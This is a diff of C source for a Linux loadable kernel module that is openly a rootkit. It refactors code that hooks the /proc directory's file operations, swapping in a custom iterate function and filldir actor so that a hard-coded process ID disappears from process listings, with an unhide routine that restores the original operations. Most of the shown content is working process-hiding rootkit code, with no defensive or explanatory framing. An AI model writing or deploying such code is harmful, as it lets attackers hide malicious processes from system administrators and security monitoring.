@@ -1,18 +1,6 @@
-#ifndef _PROC_H_
-#define _PROC_H_
-#include <linux/init.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/namei.h>
-#include <linux/fs.h>
-#include <linux/proc_fs.h>
-#define proc_pid_to_hide "3643"
-static const struct file_operations *backup_fops;
-static struct file_operations proc_fops;
-static struct inode *proc_inode;
-static char *proc_to_hide = proc_pid_to_hide;
-static struct dir_context *backup_ctx;
-static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned intd_type)
+
+#include "proc.h"
+static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off, u64 ino, unsigned intd_type)
 {
     if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
     {
@@ -21,12 +9,12 @@ static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
     }
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, intd_type);
 }
-int (* backup_iterate_shared) (struct file*, struct dir_context *);
+int (*backup_iterate_shared) (struct file*, struct dir_context*);
 struct dir_context rk_ctx = {
     .actor = rk_filldir_t,
 };
 
-int rk_iterate_shared(struct file *file, struct dir_context *ctx)
+int rk_iterate_shared(struct file* file, struct dir_context* ctx)
 {
     int result = 0;
     rk_ctx.pos = ctx->pos;
@@ -56,13 +44,11 @@ static int process_hide(void)
 static void process_unhide(void)
 {
     struct path p;
-    kern_path("/proc", 0,&p);
+    kern_path("/proc", 0, &p);
     //get inode and restore fop
     proc_inode = p.dentry->d_inode;
     proc_inode->i_fop = backup_fops;
     printk(KERN_ALERT "rk: LKM unloaded!");
-    
+
 
 }
-
-#endif 
